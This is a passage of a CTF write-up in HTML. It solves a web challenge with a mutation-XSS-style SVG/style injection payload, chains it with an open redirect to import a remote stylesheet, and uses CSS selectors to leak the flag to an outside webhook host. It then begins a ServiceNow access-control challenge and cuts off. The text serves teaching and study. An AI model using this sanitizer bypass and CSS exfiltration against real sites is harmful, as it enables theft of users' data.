style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">svg\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">      \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">th\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">tr\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">tbody\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">colgroup\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">col\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> />\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">colgroup\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">table\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"\u003Ctitle>\u003C/title>\u003Ctable>  \u003Ctbody>    \u003Ctr>      \u003Cth>        \u003Csvg>          \u003Cstyle>            INJECT\u003Ctitle>\u003C/title>          \u003C/style>        \u003C/svg>      \u003C/th>    \u003C/tr>  \u003C/tbody>  \u003Ccolgroup>    \u003Ccol />  \u003C/colgroup>\u003C/table>\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>And when its in a title context, note that the first closing title tag is before the \u003Ccode>&#x3C;style>INJECT\u003C/code>, meaning the style will be outside the title tag and will apply to the overall document.\u003C/p>\n\u003Ch3 id=\"exfiltration\">\u003Ca href=\"#exfiltration\">Exfiltration\u003C/a>\u003C/h3>\n\u003Cp>But still, now how do we exfiltrate? For this, we can look back to the \u003Ccode>app.js\u003C/code> and notice a few convenient gadgets. These two inclusions are expecially interesting:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">use\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">((\u003C/span>\u003Cspan style=\"--0:#FFAB70\">req\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">res\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">next\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#F97583\">const\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">key\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> value \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query[key];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">delete\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query[key];\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">req.query[key.\u003C/span>\u003Cspan style=\"--0:#B392F0\">toLowerCase\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">()] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> value;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#B392F0\">next\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">();\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">app.\u003C/span>\u003Cspan style=\"--0:#B392F0\">get\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/redirect\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, (\u003C/span>\u003Cspan style=\"--0:#FFAB70\">req\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#FFAB70\">res\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">let\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> url \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> req.query.url;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"--0:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">url.\u003C/span>\u003Cspan style=\"--0:#B392F0\">startsWith\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"http://\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x26;&#x26;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">url.\u003C/span>\u003Cspan style=\"--0:#B392F0\">startsWith\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"https://\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)) {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">url \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"http://\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> url;\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">res.\u003C/span>\u003Cspan style=\"--0:#B392F0\">redirect\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(url);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"app.use((req, res, next) => {  for (const key in req.query) {    let value = req.query[key];    delete req.query[key];    req.query[key.toLowerCase()] = value;  }  next();});app.get(&#x22;/redirect&#x22;, (req, res) => {  let url = req.query.url;  if (!url.startsWith(&#x22;http://&#x22;) &#x26;&#x26; !url.startsWith(&#x22;https://&#x22;)) {    url = &#x22;http://&#x22; + url;  }  res.redirect(url);});\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>The first seems to normalize all keys and make them lowercase. This seems like it could definately be useful, since our character set only allows uppercase characters.\u003C/p>\n\u003Cp>The second is a redirect route, which will redirect to any url we give it. Note though that this redirect endpoint will actually add \u003Ccode>http://\u003C/code> to our url if it doesn’t already start with that. This might be interesting as well since we dont have a \u003Ccode>/\u003C/code>, but can use this so get a URL.\u003C/p>\n\u003Cp>Hopefully these are hinting to the solution now, and we can put it all together. We don’t have that many characters to work with in our stylesheet, so we atleast need to import another one. Here is the final payload I used:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"html\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">TABLE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">TH\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">SVG\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">STYLE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>@IMPORT URL(REDIRECT?URL=EO5VZGJXDJI72UU.M.PIPEDREAM.NET)&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">TITLE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;\u003C/span>\u003Cspan style=\"--0:#FDAEB7;--0fs:italic\">COL\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">TITLE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"\u003CTABLE>\u003CTH>\u003CSVG>\u003CSTYLE>@IMPORT URL(REDIRECT?URL=EO5VZGJXDJI72UU.M.PIPEDREAM.NET)\u003CTITLE>\u003CCOL>\u003CTITLE>\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>This will import the stylesheet at \u003Ccode>EO5VZGJXDJI72UU.M.PIPEDREAM.NET\u003C/code>, a free webhook service.\nThis stylesheet can follow a standard CSS Leak pattern: We utilize a CSS selector on the \u003Ccode>a\u003C/code> tags’ \u003Ccode>href\u003C/code> attribute. If we have a match, we set the background to our webhook, with a parameter that identifies what letter triggered it. We can leak the flag one (or multiple) characters at a time using this procedure.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"css\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#85E89D\">a\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[\u003C/span>\u003Cspan style=\"--0:#B392F0\">href\u003C/span>\u003Cspan style=\"--0:#F97583\">^=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"view\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\?\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">content\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">sdctf{a\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">background\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">url\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{a\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#85E89D\">a\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[\u003C/span>\u003Cspan style=\"--0:#B392F0\">href\u003C/span>\u003Cspan style=\"--0:#F97583\">^=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"view\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\?\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">content\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">sdctf{b\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">background\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">url\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{b\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#85E89D\">a\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[\u003C/span>\u003Cspan style=\"--0:#B392F0\">href\u003C/span>\u003Cspan style=\"--0:#F97583\">^=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"view\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\?\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">content\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">sdctf{c\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">background\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">url\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{c\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#85E89D\">a\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[\u003C/span>\u003Cspan style=\"--0:#B392F0\">href\u003C/span>\u003Cspan style=\"--0:#F97583\">^=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"view\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\?\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">content\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">sdctf{d\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">background\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">url\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{d\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#85E89D\">a\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[\u003C/span>\u003Cspan style=\"--0:#B392F0\">href\u003C/span>\u003Cspan style=\"--0:#F97583\">^=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"view\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\?\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">content\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">sdctf{e\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">background\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">url\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{e\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#85E89D\">a\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">[\u003C/span>\u003Cspan style=\"--0:#B392F0\">href\u003C/span>\u003Cspan style=\"--0:#F97583\">^=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"view\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\?\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">content\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">sdctf{f\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#79B8FF\">background\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">url\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#FFAB70\">https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{f\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"a[href^=&#x22;view\\?content\\=sdctf{a&#x22;] {  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{a);}a[href^=&#x22;view\\?content\\=sdctf{b&#x22;] {  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{b);}a[href^=&#x22;view\\?content\\=sdctf{c&#x22;] {  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{c);}a[href^=&#x22;view\\?content\\=sdctf{d&#x22;] {  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{d);}a[href^=&#x22;view\\?content\\=sdctf{e&#x22;] {  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{e);}a[href^=&#x22;view\\?content\\=sdctf{f&#x22;] {  background: url(https://eo5vzgjxdji72uu.m.pipedream.net?flag=sdctf{f);}\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Ch3 id=\"references-2\">\u003Ca href=\"#references-2\">References\u003C/a>\u003C/h3>\n\u003Cul>\n\u003Cli>\u003Ca href=\"https://xsleaks.dev/docs/attacks/css-injection/\">https://xsleaks.dev/docs/attacks/css-injection/\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss\">https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://new-blog.ch4n3.kr/bypassing-dompurify-possibilities/\">https://new-blog.ch4n3.kr/bypassing-dompurify-possibilities/\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/\">https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/\u003C/a>\u003C/li>\n\u003Cli>\u003Ca href=\"https://mizu.re/post/intigriti-october-2023-xss-challenge\">https://mizu.re/post/intigriti-october-2023-xss-challenge\u003C/a>\u003C/li>\n\u003C/ul>\n\u003Ch2 id=\"snowfall-1-solve-500-pts\">\u003Ca href=\"#snowfall-1-solve-500-pts\">SNOWfall (1 solve, 500 pts)\u003C/a>\u003C/h2>\n\u003Ch3 id=\"description-3\">\u003Ca href=\"#description-3\">Description\u003C/a>\u003C/h3>\n\u003Cp>Flag is at \u003Ca href=\"https://dev258962.service-now.com/flag\">https://dev258962.service-now.com/flag\u003C/a>, thats it! Oh you might need a special role for it, but I hear its not too hard to request.\u003C/p>\n\u003Ch3 id=\"challenge-3\">\u003Ca href=\"#challenge-3\">Challenge\u003C/a>\u003C/h3>\n\u003Cp>We are given a link to a ServiceNow instance, and are told that the flag is at the \u003Ccode>/flag\u003C/code> endpoint. We are also told that we might need a special role for it, hinting that the \u003Ccode>/flag\u003C/code> endpoint is protected by some sort of role based access control. We are additionally given a \u003Ccode>zip\u003C/code> containing \u003Ccode>SNOWfall.xml\u003C/code>, which is an “Update Set”, similar to a \u003Ccode>patch\u003C/code> file that can be applied to a personal ServiceNow instance to recreate the challenge scenario.\u003C/p>\n\u003Ch3 id=\"notes-2\">\u003Ca href=\"#notes-2\">Notes\u003C/a>\u003C/h3>\n\u003Cp>This challenge is definately a bit different than most web challenges people are used to, even though the core vulnurability is an extremely well known javascript vulnerability that many CTF players are likely familiar with. The challenge runs on a ServiceNow instance, which is a cloud based platform that provides a variety of services, and is also used by UC San Diego themselves for internal document and case management. Since the challenge is a bit different, I will provide a brief overview of the ServiceNow platform, and how the challenge is setup, which hopefully gives a good perspective into what went into this challenge.\u003C/p>\n\u003Cp>At its core, ServiceNow breaks everything down into tables. Everything in ServiceNow is a record in some table, whether it be a user in the \u003Ccode>sys_user\u003C/code> table, a catalog item in the \u003Ccode>sc_cat_item\u003C/code> table, or an ACL policy in the \u003Ccode>sys_security_acl_list\u003C/code>. If we look at the Customer Updates in the \u003Ccode>SNOWFall.xml\u003C/code> file, we can see these more clearly:\u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;snow-updates.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>We can see the “Type” (table) as well as the Record Name for the update. What this update set added overall was the \u003Ccode>/flag\u003C/code> page, one Catalog Item called \u003Ccode>Flag Holder Application\u003C/code>, and an associated Workflow. From a better UI, the flag holder application looks like this:\n\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;snow-catitem.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>We can also see the associated variables for this catalog item on the bottom when we scroll down:\n\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;snow-variables.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>One thing to see here is that there is a \u003Ccode>meta\u003C/code> variable thats hidden. This data is populated by an \u003Ccode>onSubmit\u003C/code> Catalog Client Script, which is a script that runs when the form is submitted. This script is as follows:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">function\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">onSubmit\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">() {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#99A0A6\">// Populate the \"meta\" variable with a JSON object containing the catalog item metadata\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv 